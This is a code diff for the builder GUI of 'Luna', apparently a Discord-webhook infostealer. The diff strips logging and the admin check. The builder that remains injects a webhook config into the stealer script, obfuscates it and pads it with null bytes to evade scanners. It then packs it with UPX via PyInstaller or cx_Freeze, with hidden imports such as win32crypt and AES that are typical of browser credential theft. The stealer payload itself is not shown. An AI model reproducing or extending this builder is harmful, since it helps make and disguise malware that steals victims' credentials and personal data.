@@ -1,5 +1,4 @@
 import copy
-import logging
 import os
 import random
 import re
@@ -11,18 +10,8 @@ import time
 from tkinter import filedialog
 
 import customtkinter
-import pyuac
 import requests
 from PIL import Image
-
-logging.basicConfig(
-    level=logging.DEBUG,
-    filename='luna.log',
-    filemode='a',
-    format='[%(filename)s:%(lineno)d] - %(asctime)s - %(levelname)s - %(message)s'
-)
-
-logger = logging.getLogger(__name__)
 
 
 class App(customtkinter.CTk):
@@ -39,7 +28,7 @@ class App(customtkinter.CTk):
             "webhook": None,
             "ping": False,
             "pingtype": None,
-            "fakeerror": False,
+            "error": False,
             "startup": False,
             "defender": False,
             "systeminfo": False,
@@ -275,10 +264,8 @@ class App(customtkinter.CTk):
             if r.status_code == 200:
                 return True
             else:
-                logging.error(f"Webhook not valid. Status code: {r.status_code}. Webhook: {webhook}")
                 return False
-        except Exception as e:
-            logging.error(f"Couldn't verify webhook: {e}")
+        except requests.exceptions.RequestException:
             return False
 
     def check_webhook_button(self):
@@ -349,7 +336,7 @@ class App(customtkinter.CTk):
             "webhook": self.webhook_button,
             "ping": self.ping,
             "pingtype": self.pingtype,
-            "fakeerror": self.error,
+            "error": self.error,
             "startup": self.startup,
             "defender": self.defender,
             "systeminfo": self.systeminfo,
@@ -368,33 +355,25 @@ class App(customtkinter.CTk):
         }
 
         for key, checkbox in checkbox_mapping.items():
-            try:
-                if checkbox.get():
-                    if key == "webhook":
-                        pass
-                    else:
-                        self.updated_dictionary[key] = True
-                elif checkbox.get() == 0:
-                    self.updated_dictionary[key] = False
-                ping_message = self.pingtype.get()
-                if ping_message in ["Here", "Everyone"]:
-                    self.updated_dictionary["pingtype"] = ping_message
-                elif self.ping.get() == 0:
-                    self.updated_dictionary["pingtype"] = "None"
-            except Exception as e:
-                logging.error(f"Error with updating config: {e}")
+            if checkbox.get():
+                if key == "webhook":
+                    pass
+                else:
+                    self.updated_dictionary[key] = True
+            elif checkbox.get() == 0:
+                self.updated_dictionary[key] = False
+            ping_message = self.pingtype.get()
+            if ping_message in ["Here", "Everyone"]:
+                self.updated_dictionary["pingtype"] = ping_message
+            elif self.ping.get() == 0:
+                self.updated_dictionary["pingtype"] = "None"
 
     def get_filetype(self):
-        try:
-            file_type = self.fileopts.get()
-            if file_type == ".py":
-                logging.info(f"Changed filetype: {file_type}")
-                return file_type.replace(".", "")
-            else:
-                logging.info(f"Changed filetype: {file_type}")
-                return file_type
-        except Exception as e:
-            logging.error(f"Error with getting filetype: {e}")
+        file_type = self.fileopts.get()
+        if file_type == ".py":
+            return file_type.replace(".", "")
+        else:
+            return file_type
 
     def reset_check_webhook_button(self):
         self.checkwebhook_button.configure(fg_color="#5d11c3", hover_color="#5057eb", text="Check Webhook")
@@ -415,108 +394,91 @@ class App(customtkinter.CTk):
                              fg_color="#5d11c3", hover_color="#5057eb")
 
     def return_filename(self):
-        try:
-            get_file_name = self.filename.get()
-            if not get_file_name:
-                random_name = ''.join(random.choices(string.ascii_letters, k=5))
-                logging.info(f"Retrieved filename: test-{random_name}")
-                return f"test-{random_name}"
-            else:
-                logging.info(f"Retrieved filename: {get_file_name}")
-                return get_file_name
-        except Exception as e:
-            logging.error(f"Error with getting filename: {e}")
+        get_file_name = self.filename.get()
+        if not get_file_name:
+            random_name = ''.join(random.choices(string.ascii_letters, k=5))
+            return f"test-{random_name}"
+        else:
+            return get_file_name
 
     def get_config(self):
-        try:
-            with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
-                code = f.read()
+        with open(self.basefilepath + "\\luna.py", 'r', encoding="utf-8") as f:
+            code = f.read()
 
-            config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
-            config_match = re.search(config_regex, code, re.DOTALL)
-            if config_match:
-                config = config_match.group(0)
-            else:
-                raise Exception("Could not find config in luna.py")
+        config_regex = r"__CONFIG__\s*=\s*{(.*?)}"
+        config_match = re.search(config_regex, code, re.DOTALL)
+        if config_match:
+            config = config_match.group(0)
+        else:
+            raise Exception("Could not find config in luna.py")
 
-            copy_dict = copy.deepcopy(self.updated_dictionary)
-            config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
-            code = code.replace(config, config_str)
-            logging.info(f"Successfully changed config")
-            return code
-        except Exception as e:
-            logging.error(f"Error with config: {e}")
+        copy_dict = copy.deepcopy(self.updated_dictionary)
+        config_str = f"""__CONFIG__ = {repr(copy_dict)}"""
+        code = code.replace(config, config_str)
+
+        return code
 
     def file_pumper(self, filename, extension, size):
-        try:
-            pump_size = size * 1024 ** 2
-            with open(f"./{filename}.{extension}", 'ab') as f:
-                for _ in range(int(pump_size)):
-                    f.write((b'\x00'))
-            logging.info(f"Successfully pumped file: {filename}.{extension}")
-        except Exception as e:
-            logging.error(f"Error with file pumper: {e}")
+        pump_size = size * 1024 ** 2
+        with open(f"./{filename}.{extension}", 'ab') as f:
+            for _ in range(int(pump_size)):
+                f.write((b'\x00'))
 
     def compile_file(self, filename, filetype):
-        try:
-            if self.iconpath is None:
-                exeicon = "NONE"
-            else:
-                exeicon = self.iconpath
+        if self.iconpath is None:
+            exeicon = "NONE"
+        else:
+            exeicon = self.iconpath
 
-            if filetype == "pyinstaller":
-                subprocess.run(["python", "./tools/upx.py"])
-                subprocess.run(["python", "-m", "PyInstaller",
-                                "--onefile", "--clean", "--noconsole",
-                                "--upx-dir=./tools", "--distpath=./",
-                                "--hidden-import", "base64",
-                                "--hidden-import", "ctypes",
-                                "--hidden-import", "json",
-                                "--hidden-import", "re",
-                                "--hidden-import", "time",
-                                "--hidden-import", "subprocess",
-                                "--hidden-import", "sys",
-                                "--hidden-import", "sqlite3",
-                                "--hidden-import", "requests_toolbelt",
-                                "--hidden-import", "psutil",
-                                "--hidden-import", "PIL",
-                                "--hidden-import", "PIL.ImageGrab",
-                                "--hidden-import", "Cryptodome",
-                                "--hidden-import", "Cryptodome.Cipher",
-                                "--hidden-import", "Cryptodome.Cipher.AES",
-                                "--hidden-import", "win32crypt",
-                                "--icon", exeicon, f"./{filename}.py"])
-                logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
+        if filetype == "pyinstaller":
+            subprocess.run(["python", "./tools/upx.py"])
+            subprocess.run(["python", "-m", "PyInstaller",
+                            "--onefile", "--clean", "--noconsole",
+                            "--upx-dir=./tools", "--distpath=./",
+                            "--hidden-import", "base64",
+                            "--hidden-import", "ctypes",
+                            "--hidden-import", "json",
+                            "--hidden-import", "re",
+                            "--hidden-import", "time",
+                            "--hidden-import", "subprocess",
+                            "--hidden-import", "sys",
+                            "--hidden-import", "sqlite3",
+                            "--hidden-import", "requests_toolbelt",
+                            "--hidden-import", "psutil",
+                            "--hidden-import", "PIL",
+                            "--hidden-import", "PIL.ImageGrab",
+                            "--hidden-import", "Cryptodome",
+                            "--hidden-import", "Cryptodome.Cipher",
+                            "--hidden-import", "Cryptodome.Cipher.AES",
+                            "--hidden-import", "win32crypt",
+                            "--icon", exeicon, f"./{filename}.py"])
 
-            elif filetype == "cxfreeze":
-                cmd_args = [
-                    "cxfreeze",
-                    f"{filename}.py",
-                    "--target-name", filename,
-                    "--base-name", "Win32GUI",
-                    "--includes", "base64",
-                    "--includes", "ctypes",
-                    "--includes", "json",
-                    "--includes", "re",
-                    "--includes", "time",
-                    "--includes", "subprocess",
-                    "--includes", "sys",
-                    "--includes", "sqlite3",
-                    "--includes", "requests_toolbelt",
-                    "--includes", "psutil",
-                    "--includes", "PIL",
-                    "--includes", "PIL.ImageGrab",
-                    "--includes", "Cryptodome",
-                    "--includes", "Cryptodome.Cipher",
-                    "--includes", "Cryptodome.Cipher.AES",
-                    "--includes", "win32crypt"
-                ]
-                if exeicon != "NONE":
-                    cmd_args += ["--icon", exeicon]
-                subprocess.run(cmd_args)
-                logging.info(f"Successfully compiled {filename}.exe with cxfreeze")
-        except Exception as e:
-            logging.error(f"Error with compiling file: {e}")
+        elif filetype == "cxfreeze":
+            cmd_args = [
+                "cxfreeze",
+                f"{filename}.py",
+                "--target-name", filename,
+                "--base-name", "Win32GUI",
+                "--includes", "base64",
+                "--includes", "ctypes",
+                "--includes", "json",
+                "--includes", "re",
+                "--includes", "time",
+                "--includes", "subprocess",
+                "--includes", "sys",
+                "--includes", "sqlite3",
+                "--includes", "requests_toolbelt",
+                "--includes", "psutil",
+                "--includes", "PIL",
+                "--includes", "PIL.ImageGrab",
+                "--includes", "Cryptodome",
+                "--includes", "Cryptodome.Cipher",
+                "--includes", "Cryptodome.Cipher.AES",
+                "--includes", "win32crypt"
+            ]
+            if exeicon != "NONE":
+                cmd_args += ["--icon", exeicon]
+            subprocess.run(cmd_args)
 
     def cleanup_files(self, filename):
         cleans_dir = {'./__pycache__', './build'}
@@ -526,82 +488,67 @@ class App(customtkinter.CTk):
             try:
                 if os.path.isdir(clean):
                     shutil.rmtree(clean)
-                    logging.info(f"Successfully removed directory: {clean}")
-            except Exception as e:
-                logging.error(f"Couldn't remove directory: {clean}. {e}")
+            except Exception:
                 pass
                 continue
         for clean in cleans_file:
             try:
                 if os.path.isfile(clean):
                     os.remove(clean)
-                    logging.info(f"Successfully removed file: {clean}")
-            except Exception as e:
-                logging.error(f"Couldn't remove file: {clean}. {e}")
+            except Exception:
                 pass
                 continue
 
     def write_and_obfuscate(self, filename):
-        try:
-            with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
-                f.write(self.get_config())
+        with open(f"./{filename}.py", 'w', encoding="utf-8") as f:
+            f.write(self.get_config())
 
-            if self.obfuscation.get() == 1:
-                os.system(f"python ./tools/obfuscation.py ./{filename}.py")
-                os.remove(f"./{filename}.py")
-                os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
-                logging.info(f"Successfully obfuscated file: {filename}.py")
-        except Exception as e:
-            logging.error(f"Error with writing and obfuscating file: {e}")
+        if self.obfuscation.get() == 1:
+            os.system(f"python ./tools/obfuscation.py ./{filename}.py")
+            os.remove(f"./{filename}.py")
+            os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
 
     def buildfile(self):
-        try:
-            filename = self.return_filename()
+        filename = self.return_filename()
 
-            if self.get_filetype() == "py":
-                self.write_and_obfuscate(filename)
+        if self.get_filetype() == "py":
+            self.write_and_obfuscate(filename)
 
-                if self.pump.get() == 1:
-                    self.file_pumper(filename, "py", self.get_mb())
+            if self.pump.get() == 1:
+                self.file_pumper(filename, "py", self.get_mb())
 
-                self.built_file()
-                self.builder_frame.after(3000, self.reset_build_button)
+            self.built_file()
+            self.builder_frame.after(3000, self.reset_build_button)
 
-            elif self.get_filetype() == "pyinstaller":
-                self.write_and_obfuscate(filename)
+        elif self.get_filetype() == "pyinstaller":
+            self.write_and_obfuscate(filename)
 
-                thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
-                thread.start()
-                self.building_button_thread(thread)
+            thread = threading.Thread(target=self.compile_file, args=(filename, "pyinstaller",))
+            thread.start()
+            self.building_button_thread(thread)
 
-                if self.pump.get() == 1:
-                    self.file_pumper(filename, "exe", self.get_mb())
+            if self.pump.get() == 1:
+                self.file_pumper(filename, "exe", self.get_mb())
 
-                self.built_file()
-                self.builder_frame.after(3000, self.reset_build_button)
-                self.cleanup_files(filename)
+            self.built_file()
+            self.builder_frame.after(3000, self.reset_build_button)
+            self.cleanup_files(filename)
 
-            elif self.get_filetype() == "cxfreeze":
-                self.write_and_obfuscate(filename)
+        elif self.get_filetype() == "cxfreeze":
+            self.write_and_obfuscate(filename)
 
-                thread = threading.Thread(target=self.compile_file, args=(filename, "cxfreeze",))
-                thread.start()
-                self.building_button_thread(thread)
+            thread = threading.Thread(target=self.compile_file, args=(filename, "cxfreeze",))
+            thread.start()
+            self.building_button_thread(thread)
 
-                if self.pump.get() == 1:
-                    self.file_pumper(filename, "exe", self.get_mb())
+            if self.pump.get() == 1:
+                self.file_pumper(filename, "exe", self.get_mb())
 
-                self.built_file()
-                self.builder_frame.after(3000, self.reset_build_button)
-                os.remove(f"./{filename}.py")
-        except Exception as e:
-            logging.error(f"Error with building file: {e}")
+            self.built_file()
+            self.builder_frame.after(3000, self.reset_build_button)
+            os.remove(f"./{filename}.py")
 
 
 if __name__ == "__main__":
-    if not pyuac.isUserAdmin():
-        logging.error("File must be run with admin privileges")
-        pyuac.runAsAdmin()
-    else:
-        app = App()
-        app.mainloop()
+    app = App()
+    app.mainloop()
